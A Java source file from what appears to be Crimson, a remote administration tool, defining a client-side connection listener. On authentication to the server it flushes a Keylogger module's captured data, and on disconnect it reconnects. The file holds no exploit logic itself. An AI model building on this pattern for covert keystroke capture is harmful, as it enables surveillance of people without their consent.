/******************************************************************************
 *                                                                            *
 *                    Copyright 2017 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.net.listener;

import java.util.Observable;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.net.ClientConnectionStore;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.Connector.CertificateState;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.listener.ConnectionEventListener;
import com.subterranean_security.crimson.core.util.IDGen.Reserved;

public class ClientConnectionEventListener extends ConnectionEventListener {

	@Override
	public void update(Observable arg0, Object arg1) {
		super.update(arg0, arg1);

		Connector connector = (Connector) arg0;
		if (arg1 instanceof ConnectionState) {
			if (connector.getCvid() == Reserved.SERVER) {
				switch ((ConnectionState) arg1) {
				case AUTHENTICATED:
					Keylogger.flush();
					break;
				case CONNECTED:
					break;
				case NOT_CONNECTED:
					ClientConnectionStore.connectionRoutine();
					break;
				default:
					break;

				}
			}
		} else if (arg1 instanceof CertificateState) {

		}

	}

}